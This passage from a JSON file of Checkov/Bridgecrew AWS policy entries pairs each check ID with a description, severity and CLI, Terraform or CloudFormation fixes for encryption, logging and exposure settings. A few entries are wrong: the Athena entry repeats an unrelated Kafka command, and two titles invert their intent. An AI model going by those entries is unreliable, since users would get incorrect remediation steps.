true\n      ...\n",
        "severity": "LOW"
    },
    "CKV_AWS_74": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_28",
        "description": "DocumentDB is not encrypted at rest\nDescription\nThe encryption feature available for Amazon DocumentDB clusters provides an additional layer of data protection by helping secure your data against unauthorized access to the underlying storage.\nAmazon DocumentDB allows you to encrypt your clusters using keys managed through the AWS Key Management Service (KMS). On a cluster running with Amazon DocumentDB encryption, data stored at rest in the underlying storage is encrypted, as are its automated backups, snapshots, and replicas in the same cluster. \nFix - Runtime \nProcedure\n\nCreate an Amazon DocumentDB cluster.\nUnder the Authentication section, choose Show advanced settings.\nScroll down to the Encryption-at-rest section.\nChoose the option that you want for encryption at rest. Whichever option you choose, you can't change it after the cluster is created.\n\nTo encrypt data at rest in this cluster, choose Enable encryption.\nCLI Command\nGoaws docdb create-db-cluster \\\n      --db-cluster-identifier sample-cluster \\\n      --port 27017 \\\n      --engine docdb \\\n      --master-username yourMasterUsername \\\n      --master-user-password yourMasterPassword \\\n      --storage-encrypted\n\nFix - Buildtime \nTerraform\n\nResource: aws_docdb_cluster\nArguments: storage_encrypted - Specifies whether the DB cluster is encrypted. \n\nGoresource \"aws_docdb_cluster\" \"example\" {\n  ...\n  cluster_identifier = \"docdb-cluster-demo\"\n+ storage_encrypted  = true\n  ...\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_75": {
        "url": "https://docs.bridgecrew.io/docs/logging_16",
        "description": "Global Accelerator does not have Flow logs enabled\nDescription\nGlobal Accelerator is a networking service that sends traffic through AWS's global network enabling global access to your web apps. Flow logs allow capturing information about the IP address traffic going to and from network interfaces in the AWS Global Accelerator. Flow log data is published to Amazon S3, where it can be retrieved and viewed.\nFlow logs enable troubleshooting if specific traffic is not reaching an endpoint, helping you to diagnose overly restrictive security group rules. It can also be used to monitor the traffic that is reaching endpoints in a VPC and establish if they should be receiving that traffic.\nFix - Runtime \nCLI Command\n\nCreate an S3 bucket for your flow logs.\nAdd an IAM policy for the AWS user who is enabling the flow logs.\nRun the following commands, with the S3 bucket name and prefix that you want to use for your log files:\n\nShellaws globalaccelerator update-accelerator-attributes \n       --accelerator-arn arn:aws:globalaccelerator::012345678901:accelerator/1234abcd-abcd-1234-abcd-1234abcdefgh \n       --region us-west-2\n       --flow-logs-enabled\n       --flow-logs-s3-bucket s3-bucket-name \n       --flow-logs-s3-prefix s3-bucket-prefix\n\nFix - Buildtime \nTerraform\n\nResource: aws_globalaccelerator_accelerator\nArgument: flow_logs_enabled - (Optional) Indicates whether flow logs are enabled. \n\nGoresource \"aws_globalaccelerator_accelerator\" \"example\" {\n  name            = \"Example\"\n  ip_address_type = \"IPV4\"\n  enabled         = true\n\n  attributes {\n+    flow_logs_enabled   = true\n+    flow_logs_s3_bucket = \"example-bucket\"\n+    flow_logs_s3_prefix = \"flow-logs/\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_76": {
        "url": "https://docs.bridgecrew.io/docs/logging_17",
        "description": "API Gateway does not have access logging enabled\nDescription\nEnabling the custom access logging option in API Gateway allows delivery of custom logs to CloudWatch Logs, which can be analyzed using CloudWatch Logs Insights. Using custom domain names in Amazon API Gateway allows insights into requests sent to each custom domain name. If there is more than one custom domain name mapped to a single API, understanding the quantity and type of requests by domain name may help understand request patterns.\nFix - Runtime \nAWS Console\nProcedure:\n\nLog in to the AWS Management Console at [https://console.aws.amazon.com/].\nOpen the Amazon API Gateway console.\nFind the Stage Editor for your API.\nOn the Stage Editor pane, choose the Logs/Tracing tab.\nOn the Logs/Tracing tab, under CloudWatch Settings, do the following to enable execution logging.\nSelect the Enable CloudWatch Logs check box.\nFor Log level, choose INFO to generate execution logs for all requests. Or, choose ERROR to generate execution logs only for requests to your API that result in an error.\nSelect the Log full requests/responses data check box for a REST API. Or, select the Log full message data check box for a WebSocket API.\nUnder Custom Access Logging, select the Enable Access Logging check box.\nFor Access Log Destination ARN, enter the ARN of a CloudWatch log group or an Amazon Kinesis Data Firehose stream.\nEnter a Log Format. For guidance, you can choose CLF, JSON, XML, or CSV to see an example in that format.\nClick Save Changes.\n\nFix - Buildtime \nTerraform\n\nResource: aws_api_gateway_stage\nArgument: access_log_settings - (Optional) Enables access logs for the API stage. Detailed below. \n\nGoresource \"aws_api_gateway_stage\" \"test\" {\n  ...\n  stage_name    = \"prod\"\n+ access_log_settings {\n+   destination_arn = \"${aws_cloudwatch_log_group.example.arn}\"\n+   format          = \"...\"  \n+  }\n  ...\n}\n\nCloudFormation\n\nResource: AWS::ApiGateway::Stage\nArgument: Properties.AccessLogSettings.DestinationArn\n\nYAMLResources:\n  MyStage:\n    Type: AWS::ApiGateway::Stage\n    Properties:\n      ...\n      AccessLogSetting:\n        DestinationArn: 'arn:aws:logs:us-east-1:123456789:log-group:example-log-group'\n        Format: \"...\"\n        ...\n",
        "severity": "LOW"
    },
    "CKV_AWS_78": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_30",
        "description": "CodeBuild project encryption is disabled\nDescription\nAWS CodeBuild is a fully managed build service in the cloud. CodeBuild compiles your source code, runs unit tests, and produces artifacts that are ready to deploy. Build artifacts, such as a cache, logs, exported raw test report data files, and build results, are encrypted by default using CMKs for Amazon S3 that are managed by the AWS Key Management Service. If you do not want to use these CMKs, you must create and configure a customer-managed CMK.\nFix - Buildtime \nTerraform\n\nResource: aws_codebuild_project\nArguments: encryption_disabled - (Optional) If set to true, output artifacts will not be encrypted. If type is set to NO_ARTIFACTS then this value will be ignored. Defaults to false.\nTo fix, either set to false or remove attribute.\n\nGoresource \"aws_codebuild_project\" \"project-with-cache\" {\n  ...\n  name           = \"test-project-cache\"\n  artifacts {\n+    encryption_disabled = false\n  }\n  ...\n}\n\nCloudFormation\n\nResource: AWS::CodeBuild::Project\nArguments: Properties.Artifacts - (Optional) If set to true, output artifacts will not be encrypted. If type is set to NO_ARTIFACTS then this value will be ignored. Defaults to false. \n\nYAMLResources: \n  CodeBuildProject:\n    Type: AWS::CodeBuild::Project\n    Properties: \n      ...\n      Artifacts:\n        ...\n                Type: S3       \n-               EncryptionDisabled: True\n+               EncryptionDisabled: False\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_79": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_31",
        "description": "Instance Metadata Service version 1 is enabled\nDescription\nThe Instance Metadata Service (IMDS) is an on-instance component used by code on the instance to securely access instance metadata. You can access instance metadata from a running instance using one of the following methods:\n\nInstance Metadata Service Version 1 (IMDSv1) \u2013 a request/response method\nInstance Metadata Service Version 2 (IMDSv2) \u2013 a session-oriented method\n\nAs a request/response method IMDSv1 is prone to local misconfigurations: \n\nOpen proxies, open NATs and routers, server-side reflection vulnerabilities.\nOne way or another, local software might access local-only data.\n\nFix - Buildtime \nTerraform\n\nResource: aws_instance\nArguments: http_tokens - (Optional) Whether or not the metadata service requires session tokens, the mechanism used for Instance Metadata Service Version 2. Can be \"optional\" or \"required\". (Default: \"optional\"). Set to \"required\" to enable Instance Metadata Service V2.\n\nAlternatively, disable the metadata service altogether by setting http_endpoint = \"disabled\".\nGoresource \"aws_instance\" \"example\" {\n  ...\n  instance_type     = \"t2.micro\"\n+   metadata_options {\n        ...\n+       http_endpoint = \"enabled\"\n+       http_tokens   = \"required\"\n+  }\n  ...\n}\n\nIf setting http_tokens = \"required\" in a launch template that is being used for a EKS worker/node group, you should consider setting the http_put_response_hop_limit = 2 per the default behavior in EKS.\nWithout this setting the default service account in EKS will not be able to access the instance metadata service.\nCloudFormation\n\nResource: AWS::EC2::LaunchTemplate\nArguments: Properties.MetadataOptions.HttpEndpoint /  Properties.MetadataOptions.HttpTokens\n\nYAMLResources:\n  IMDSv1Disabled:\n    Type: AWS::EC2::LaunchTemplate\n    Properties:\n        ...\n      LaunchTemplateData:\n        ...\n+       MetadataOptions:\n+         HttpEndpoint: disabled\n          \n  IMDSv2Enabled:\n    Type: AWS::EC2::LaunchTemplate\n    Properties:\n      ...\n      LaunchTemplateData:\n        ...\n+       MetadataOptions:\n+         HttpTokens: required\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_80": {
        "url": "https://docs.bridgecrew.io/docs/logging_18",
        "description": "Amazon MSK cluster logging is not enabled\nDescription\nAmazon MSK enables you to build and run applications that use Apache Kafka to process streaming data. It also provides a control-plane for advanced operations, for example, creating, updating, and deleting clusters. \nConsistent cluster logging helps you determine if a  request was made with root or AWS Identity and Access Management (IAM) user credentials and whether the request was made with temporary security credentials for a role or federated user.\nFix - Runtime \nAWS Console\nNew Cluster: \n\nLog in to the AWS Management Console at [https://console.aws.amazon.com/].\nOpen the Amazon MSK console.\nGo to Broker Log Delivery in the Monitoring section. \nSpecify the destinations to which you want Amazon MSK to deliver your broker logs.\n\nExisting Cluster:\n\nIn the Amazon MSK console  choose the cluster from your list of clusters.\nGo to the Details tab. Scroll down to the Monitoring section and click Edit.\nSpecify the destinations to which you want Amazon MSK to deliver your broker logs.\n\nCLI Command\nWhen you use the create-cluster or the update-monitoring commands, you can optionally specify the logging-info parameter and pass to it a JSON structure. In this JSON, all three destination types are optional.\nJSON{\n  \"BrokerLogs\": {\n    \"S3\": {\n      \"Bucket\": \"ExampleBucketName\",\n      \"Prefix\": \"ExamplePrefix\",\n      \"Enabled\": true\n    },\n    \"Firehose\": {\n      \"DeliveryStream\": \"ExampleDeliveryStreamName\",\n      \"Enabled\": true\n    },\n    \"CloudWatchLogs\": {\n      \"Enabled\": true,\n      \"LogGroup\": \"ExampleLogGroupName\"\n    }\n  }\n}\n\nFix - Buildtime \nTerraform\n\nResource: aws_msk_cluster\nArgument: logging_info - (Optional) Configuration block for streaming broker logs to Cloudwatch/S3/Kinesis Firehose. See below. \n\nGoresource \"aws_msk_cluster\" \"example\" {\n  cluster_name           = \"example\"\n  ...\n+  logging_info {\n+    broker_logs {\n+      cloudwatch_logs {\n+        enabled   = true\n+        log_group = aws_cloudwatch_log_group.test.name\n      }\n\nCloudFormation\n\nResource:AWS::MSK::Cluster\nArgumentLoggingInfo. Configure your MSK cluster to send broker logs to different destination types. This is a container for the configuration details related to broker logs. \n\nGo{\n  \"Type\" : \"AWS::MSK::Cluster\",\n  \"Properties\" : {\n      ...\n+    \"LoggingInfo\" : {\n+      \"BrokerLogs\" : {\n+        \"CloudWatchLogs\" : CloudWatchLogs,\n+        \"Firehose\" : Firehose,\n+        \"S3\" : S3\n      }\n    }\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_81": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_32",
        "description": "MSK cluster encryption at rest and in transit is not enabled\nDescription\nAmazon MSK integrates with AWS Key Management Service (KMS) for server-side encryption. When you create an MSK cluster, you can specify the AWS KMS CMK for Amazon MSK to use to encrypt your data at rest. If you don't specify a CMK, Amazon MSK creates an AWS managed CMK for you and uses it on your behalf. \nWe recommend using encryption in transit and at rest to secure your managed Kafka queue.\nFix - Runtime \nCLI Command\nRun the create-cluster command and use the encryption-info option to point to the file where you saved your configuration JSON. \nShellaws kafka create-cluster\n--cluster-name \"ExampleClusterName\"\n--broker-node-group-info file://brokernodegroupinfo.json\n--encryption-info file://encryptioninfo.json\n--kafka-version \"2.2.1\"\n--number-of-broker-nodes 3\n\nFix - Buildtime \nTerraform\n\nResource: aws_msk_cluster\nArguments: encryption_info - (Optional) Configuration block for specifying encryption.\nencryption_in_transit - (Optional) Configuration block to specify encryption in transit. See below.\n\nGoresource \"aws_msk_cluster\" \"example\" {\n  cluster_name           = \"example\"\n  ...\n    + encryption_info {\n  +    encryption_at_rest_kms_key_arn = aws_kms_key.kms.arn\n  +   \n    +    encryption_in_transit {\n    +        client_broker = \"TLS\"\n    +        in_cluster    = true \n  +     }\n  + }\n  ...\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_82": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_33",
        "description": "Athena workgroup does not prevent disabling encryption\nDescription\nYou can configure settings at the workgroup level, enforce control over the workgroup. This only affects you if you run queries in the workgroup; if you do, workgroup settings are used.\nIf a query runs in a workgroups and the workgroup overrides client-side settings, Athena uses the workgroup's settings for encryption. It also overrides any other settings specified for the query in the console, by using API operations, or with drivers.\nFix - Runtime \nCLI Command\nRun the create-cluster command and use the encryption-info option to point to the file where you saved your configuration JSON. \nShellaws kafka create-cluster\n--cluster-name \"ExampleClusterName\"\n--broker-node-group-info file://brokernodegroupinfo.json\n--encryption-info file://encryptioninfo.json\n--kafka-version \"2.2.1\"\n--number-of-broker-nodes 3\n\nFix - Buildtime\nTerraform\n\nResource: aws_athena_workgroup\nArgument: enforce_workgroup_configuration - (Optional) Boolean whether the settings for the workgroup override client-side settings. For more information, see Workgroup Settings Override Client-Side Settings. Defaults to true. \n\naws_athena_workgroup.example.tfresource \"aws_athena_workgroup\" \"example\" {\n  name = \"example\"\n ...\n  configuration {\n    enforce_workgroup_configuration    = true\n    publish_cloudwatch_metrics_enabled = true\n\n    result_configuration {\n      output_location = \"s3://{aws_s3_bucket.example.bucket}/output/\"\n\n      encryption_configuration {\n        encryption_option = \"SSE_KMS\"\n        kms_key_arn       = aws_kms_key.example.arn\n      }\n    }\n  }\n}\n\nCloudFormation\n\nResource:  AWS::Athena::WorkGroup\nArgument: Properties.WorkGroupConfiguration.EnforceWorkGroupConfiguration\n\nYAMLResources:\n  MyAthenaWorkGroup:\n    Type: AWS::Athena::WorkGroup\n    Properties:\n      ...\n+     WorkGroupConfiguration:\n+       EnforceWorkGroupConfiguration: true\n        ...\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_84": {
        "url": "https://docs.bridgecrew.io/docs/elasticsearch_7",
        "description": "AWS Elasticsearch domain logging is not enabled\nDescription\nAmazon ES exposes logs through CloudWatch. ES logs supported include error logs, search slow logs, index slow logs, and audit logs. All the logs are disabled by default. ES logs enable troubleshooting performance and stability issues. Audit logs track user activity for compliance purposes. If enabled, standard CloudWatch pricing applies.\nWe recommend you enable elasticsearch domain logging. \nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/. \nOpen the Amazon Elasticsearch console.\nIn the navigation pane, under My domains, select the domain that you want to update.\n4.Navigate to the Logs tab. For the log that you are working with, select Enable.\nCreate a CloudWatch log group, or select an existing one.\nSelect an access policy that contains the appropriate permissions, or create a new policy. Select Enable.\nThe status of your domain changes from Active to Processing. Prior to log publishing being enabled, the status of your domain must return to Active. \n\nCLI Command\nBefore you can enable log publishing, you need a CloudWatch log group. If you don't already have one, you will need to can create one.\nShellaws logs put-resource-policy --policy-name my-policy --policy-document <policy_doc_json>\n\nFix - Buildtime \nTerraform\n\nResource: aws_elasticsearch_domain\nArgument: log_publishing_options - (Optional) Options for publishing slow and application logs to CloudWatch Logs. This block can be declared multiple times, for each log_type, within the same resource. \n\nGoresource \"aws_elasticsearch_domain\" \"example\" {\n  ...\n  domain_name           = \"example\"\n  log_publishing_options {\n    cloudwatch_log_group_arn = aws_cloudwatch_log_group.example.arn\n    log_type                 = \"INDEX_SLOW_LOGS\"\n  }\n}\n\nCloudFormation\n\nResource: AWS::Elasticsearch::Domain\nArgument: Properties.LogPublishingOptions.AUDIT_LOGS.Enabled\n\nYAMLResources:\n  Resource0:\n    Type: 'AWS::Elasticsearch::Domain'\n    Properties:\n      ...\n      LogPublishingOptions:\n        AUDIT_LOGS:\n+         Enabled: True\n          ...\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_85": {
        "url": "https://docs.bridgecrew.io/docs/logging_19",
        "description": "AWS DocumentDB logging is not enabled\nDescription\nThe events recorded by the AWS DocumentDB audit logs include: successful and failed authentication attempts, creating indexes or dropping a collection in a database within the DocumentDB cluster.\nAWS CloudWatch logs are a service that monitors, stores and accesses your log files from a variety of sources within your AWS account. When logging is enabled information such as Data Definition Language, authentication, authorization, and user management events are sent to AWS CloudWatch logs. This information can be used to analyze, monitor and archive your Amazon DocumentDB auditing events for security and compliance requirements.\nFix - Runtime \nAWS Console\n\nLog in to the AWS Management Console at [https://console.aws.amazon.com/].\nOpen the Amazon DocumentDB.\nIn the navigation pane, choose Clusters.\nSpecify the cluster that you want to modify by choosing the button to the left of the cluster's name.\nChoose Actions, then click Modify.\nIn the Modify Cluster:  pane.\nGo to Log Exports and enable exporting audit or profiler logs.\n\nCLI Command\nUse the modify-db-cluster operation to modify the specified cluster using the AWS CLI.\nShellaws docdb modify-db-cluster \\\n   --db-cluster-identifier sample-cluster \\\n   --cloudwatch-logs-export-configuration '{\"EnableLogTypes\":[\"audit\"]}'\n\nFix - Buildtime \nTerraform\n\nResource: aws_docdb_cluster\nArgument: enabled_cloudwatch_logs_exports - (Optional) List of log types to export to cloudwatch. If omitted, no logs will be exported. The following log types are supported: audit, profiler. \n\nGoresource \"aws_docdb_cluster\" \"docdb\" {\n  cluster_identifier      = \"my-docdb-cluster\"\n  ...\n+ enabled_cloudwatch_logs_exports  = [\"audit\", \"profiler\"]\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_86": {
        "url": "https://docs.bridgecrew.io/docs/logging_20",
        "description": "AWS CloudFront distribution has access logging disabled\nDescription\nCloudfront access logs contain detailed information (requested object name, date and time of the access, client IP, access point, error code, etc) about each request made for your web content. This information can be extremely useful during security audits, or as input data for various analytics/reporting tools. \nPairing with Lambda and WAF logs could help expedite a response process and possibly enable blocking requests coming from IP addresses that generate multiple errors. These spikes in errors could possibly indicate they were made by attackers trying to find vulnerabilities within your web application.\nFix - Runtime \nAWS Cloud Front Console\nProcedure:\n\nLog in to the AWS Management Console at [https://console.aws.amazon.com/].\nOpen the AMazon CloudFront console.\nSelect a CloudFront Distribution that is missing access logging.\nFrom the menu, click Distribution Settings  to get into the configuration page.\nFrom the General tab on the top menu, click Edit.  \nIn Distribution Settings tab scroll down and verify the Logging feature configuration status. If Logging is Off then it cannot create log files that contain detailed information about every user request that CloudFront receives.\nClick ON to initiate the Logging feature of CloudFront to log all viewer requests for files in your distribution.\n\nCLI Command\n\nCreate an S3 bucket to store your access logs. \nCreate a JSON file to enable logging and set an S3 bucket location to configure a destination for logs files.\n\nlogging{\n      \"ETag\": \"ETAGID001\",\n      \"DistributionConfig\": {\n          ...\n          \"Logging\": {\n            \"Bucket\": \"cloudfront-logging.s3.amazonaws.com\",\n            \"Enabled\": true,\n          },\n        }\n      }\n    }\n\n\nRun update-distribution to update your distribution with your distribution id, the path of the configuration file, and your etag.\n\nShellaws cloudfront update-distribution\n        --id ID000000000000\n        --distribution-config logging.json\n        --if-match ETAGID001\n\nFix - Buildtime\nTerraform\n\nResource: aws_cloudfront_distribution\nArgument: logging_config (Optional) - The logging configuration that controls how logs are written to your distribution (maximum one). \n\nGoresource \"aws_cloudfront_distribution\" \"s3_distribution\" {\n  ...\n  default_root_object = \"index.html\"\n+ logging_config {\n+   bucket          = \"mylogs.s3.amazonaws.com\"\n    ...\n  }\n}\n\nCloudFormation\n\nResource: AWS::CloudFront::Distribution\nArgument: Properties.DistributionConfig.Logging/Bucket\n\nYAMLResources:\n  MyCloudFrontDistribution:\n    Type: 'AWS::CloudFront::Distribution'\n    Properties:\n        ...\n      DistributionConfig:\n        ...\n+       Logging:\n+         Bucket: myawslogbucket.s3.amazonaws.com\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_88": {
        "url": "https://docs.bridgecrew.io/docs/public_12",
        "description": "AWS EC2 instances aren't automatically made public and given public IP addresses\nDescription\nA public IP address is an IPv4 address that is reachable from the Internet. You can use public addresses for communication between your instances and the Internet. Each instance that receives a public IP address is also given an external DNS hostname.\nWe recommend you control whether your instance receives a public IP address as required.\nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon VPC console.\nIn the navigation pane, select Subnets.\nSelect a subnet, then select Subnet Actions > Modify auto-assign IP settings.\nSelect auto-assign public IPv4 address. When selected, requests a public IPv4 address for all instances launched into the selected subnet. Select or clear the setting as required.\nClick Save.\n\nFix - Buildtime \nTerraform\n\nResource: aws_instance\nArgument: associate_public_ip_address - (Optional) Associate a public ip address with an instance in a VPC. Boolean value. \n\nGoresource \"aws_instance\" \"bar\" {\n  ...\n- associate_public_ip_address = true\n}\n\nCloudFormation\n\nResource: AWS::EC2::Instance / AWS::EC2::LaunchTemplate\nArgument: NetworkInterfaces.AssociatePublicIpAddress - (Optional) Associate a public ip address with an instance in a VPC. Boolean value. \n\nYAMLResources:\n  EC2Instance:\n    Type: AWS::EC2::Instance\n    Properties: \n      ...\n      NetworkInterfaces: \n        - ...\n-                   AssociatePublicIpAddress: true\n\n  EC2LaunchTemplate:\n    Type: AWS::EC2::LaunchTemplate\n    Properties:\n      LaunchTemplateData:\n        ...\n        NetworkInterfaces: \n          - ...\n-           AssociatePublicIpAddress: true\n",
        "severity": "HIGH"
    },
    "CKV_AWS_89": {
        "url": "https://docs.bridgecrew.io/docs/public_13",
        "description": "DMS replication instance should be publicly accessible\nDescription\nAWS Database Migration Service (AWS DMS) is a service for migrating relational databases, data warehouses, NoSQL databases and other data stores. DMS can be used to migrate data into the AWS Cloud, between on-premises instances, or between combinations of cloud and on-premises environments.\nAn AWS DMS replication instance can have one public IP address and one private IP address, just like an Amazon Elastic Compute Cloud (Amazon EC2) instance that has a public IP address. If you uncheck (disable) the box for Publicly accessible, then the replication instance has only a private IP address.\nFix - Buildtime \nTerraform\n\nResource: aws_dms_replication_instance\nArgument: publicly_accessible - (Optional, Default: false) Specifies the accessibility options for the replication instance. A value of true represents an instance with a public IP address. A value of false represents an instance with a private IP address.\n\nGoresource \"aws_dms_replication_instance\" \"test\" {\n  ...\n  allocated_storage            = 20\n+ publicly_accessible          = false\n}\n\nCloudFormation\n\nResource: AWS::DMS::ReplicationInstance\nArgument: Properties.PubliclyAccessible - (Optional, Default: false) Specifies the accessibility options for the replication instance. A value of true represents an instance with a public IP address. A value of false represents an instance with a private IP address.\n\nYAMLResources:\n  ReplicationInstance:\n    Type: AWS::DMS::ReplicationInstance\n    Properties: \n        ...\n+     PubliclyAccessible: False\n",
        "severity": "HIGH"
    },
    "CKV_AWS_90": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_networking_37",
        "description": "DocDB TLS is disabled\nDescription\nTLS can be used to encrypt the connection between an application and a DocDB cluster. By default, encryption in transit is enabled for newly created clusters. It can optionally be disabled when the cluster is created, or at a later time. When enabled, secure connections using TLS are required to connect to the cluster. \nFix - Runtime \nAWS Console\n\nSign in to the AWS Management Console, and open the Amazon DocumentDB console at https://console.aws.amazon.com/docdb.\nIn the left navigation pane, choose Clusters.\nIn the list of clusters, select the name of your cluster.\nThe resulting page shows the details of the cluster that you selected. Scroll down to Cluster details. At the bottom of that section, locate the parameter group's name below Cluster parameter group.\n\nCLI Command\nShellaws docdb describe-db-clusters \\\n    --db-cluster-identifier sample-cluster \\\n    --query 'DBClusters[*].[DBClusterIdentifier,DBClusterParameterGroup]'\n\nFix - Buildtime\nTerraform\n\nResource: aws_docdb_cluster_parameter_group\nArgument: parameter - (Optional) A list of documentDB parameters to apply.\n\nGoresource \"aws_docdb_cluster_parameter_group\" \"example\" {\n  ...\n  name        = \"example\"\n+ parameter {\n+   name  = \"tls\"\n+   value = \"enabled\"\n+  }\n}\n\nCloudFormation\n\nResource: AWS::DocDB::DBClusterParameterGroup\nArgument: Parameters.tls\n\nYAMLResources:\n  DocDBParameterGroupEnabled:\n    Type: AWS::DocDB::DBClusterParameterGroup\n    Properties: \n        ...\n      Parameters: \n        ...\n-       tls: \"disabled\"\n+               tls: \"enabled\"\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_91": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_logging_22",
        "description": "AWS ELB (Classic) with access log is disabled\nDescription\nELBv2 provide access logs that capture information about the TLS requests sent to NLBs. These access logs can be used to analyze traffic patterns and troubleshoot security and operational issues.\nAccess logging is an optional feature of ELB that is disabled by default. There is no additional charge for access logs. You are charged storage costs for Amazon S3, but not charged for the bandwidth.\nAfter you enable access logging for your load balancer, ELBv2 captures the logs as compressed files and stores them in the Amazon S3 bucket that you specify.\nFix - Runtime \nAWS Console\n\nGo to the Amazon EC2 console at https://console.aws.amazon.com/ec2/.\nIn the navigation pane, choose Load Balancers.\nSelect your load balancer.\nOn the Description tab, choose Edit attributes.\nOn the Edit load balancer attributes page, do the following:\nFor Access logs, choose Enable and specify the name of an existing bucket or a name for a new bucket.\nChoose Save.\n\nCLI Command\nShellaws elbv2 modify-load-balancer-attributes --load-balancer-arn arn:aws:elasticloadbalancing:us-west-2:123456789012:loadbalancer/app/my-load-balancer/50dc6c495c0c9188 --attributes Key=access_logs.s3.enabled,Value=true Key=access_logs.s3.bucket,Value=my-loadbalancer-logs Key=access_logs.s3.prefix,Value=myapp\n\nFix - Buildtime\nTerraform\n\nResource: aws_lb\nArgument: access_logs - (Optional) An Access Logs block. Access Logs documented below.\n\nGoresource \"aws_lb\" \"test\" {\n  ...\n  name               = \"test-lb-tf\"\n+ access_logs {\n+   bucket  = aws_s3_bucket.lb_logs.bucket\n+   prefix  = \"test-lb\"\n+   enabled = true\n+ }\n}\n\nCloudFormation\nResource: AWS::ElasticLoadBalancingV2::LoadBalancer\nArgument: Properties.LoadBalancerAttributes\nYAMLResources:\n  Resource0:\n    Type: 'AWS::ElasticLoadBalancingV2::LoadBalancer'\n    Properties:\n      ...\n      LoadBalancerAttributes:\n+     - Key: access_logs.s3.enabled\n+       Value: \"true\"\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_93": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_s3_24",
        "description": "AWS S3 bucket is not configured with MFA Delete\nDescription\nIf a bucket's versioning configuration is MFA Delete: enabled, the bucket owner must include the x-amz-mfa request header to delete an object. Requests that include x-amz-mfa must use HTTPS.\nConfiguring a bucket to enable MFA (multi-factor authentication) Delete requires additional authentication for either of the following operations:\n(1) Change the versioning state of your bucket\n(2) Permanently delete an object version.\nWe recommend you configure S3 bucket with MFA Delete: enabled.\nFix - Runtime\nCLI Command\nShellaws s3api put-bucket-versioning --profile my-root-profile --bucket my-bucket-name --versioning-configuration Status=Enabled,MFADelete=Enabled --mfa \u201carn:aws:iam::00000000:mfa/root-account-mfa-device 123456\u201d\n\nFix - Buildtime\nTerraform\nResource:aws_s3_bucket\nArgument:mfa_delete - (Optional) Enable MFA delete for either Change the versioning state of your bucket or Permanently delete an object version. Default is false. This cannot be used to toggle this setting but is available to allow managed buckets to reflect the state in AWS\naws_s3_bucket.b.tfresource \"aws_s3_bucket\" \"b\" {\n  bucket = \"my-tf-test-bucket\"\n  acl    = \"private\"\n\n  versioning {\n    enabled = true\n  +  mfa_delete = true\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_96": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_38",
        "description": "Not all data stored in Aurora is securely encrypted at rest\nDescription\nThis policy examines the resource aws_rds_cluster to check that encryption is set up. The property  storage_encrypted is examined.\nFix - Runtime\nAWS Console\nTBA\nCLI Command\nFix - Buildtime\nTerraform\n\nResource: aws_rds_cluster \nArgument: storage_encrypted\n\naws_rds_cluster.test.tfresource \"aws_rds_cluster\" \"example\" {\n  ...\n  cluster_identifier      = \"aurora-cluster-demo\"\n+ storage_encrypted       = true\n  ...\n}\n\nCloudFormation\n\nResource: AWS::RDS::DBCluster \nArgument: Properties.StorageEncrypted\n\nYAMLResources:\n  Aurora:\n    Type: 'AWS::RDS::DBCluster'\n    Properties:\n      ...\n      Engine: 'aurora'\n+     StorageEncrypted: true\n            ...\n",
        "severity": "HIGH"
    },
    "CKV_AWS_97": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_39",
        "description": "EFS volumes in ECS task definitions do not have encryption in transit enabled\nDescription\nThis check examines ECS tasks, and checks the definitions for EFS and if attached that the transit is encrypted.\nFix - Runtime\nAWS Console\nTBA\nFix - Buildtime\nTerraform\n\nResource:  aws_ecs_task_definition\nArgument: efs_volume_configuration/transit_encryption needs to ENABLED if there is an attached EFS.\n\nGoresource \"aws_ecs_task_definition\" \"example\" {\n  ...\n  family                = \"service\"\n  volume {\n        ...\n+     transit_encryption      = \"ENABLED\"\n      }\n    }\n  }\n  ...\n}\n\nCloudFormation\n\nResource:  AWS::ECS::TaskDefinition\nArgument: Properties.Volumes.EFSVolumeConfiguration.TransitEncryption.EFSVolumeConfiguration needs to ENABLED if there is an attached EFS.\n\nYAMLResources:\n  TaskDefinition:\n    Type: AWS::ECS::TaskDefinition\n    Properties:\n      ...\n      Volumes: \n        - ...\n          EFSVolumeConfiguration:\n            ...\n+           TransitEncryption: \"ENABLED\"\n",
        "severity": "HIGH"
    },
    "CKV_AWS_98": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_40",
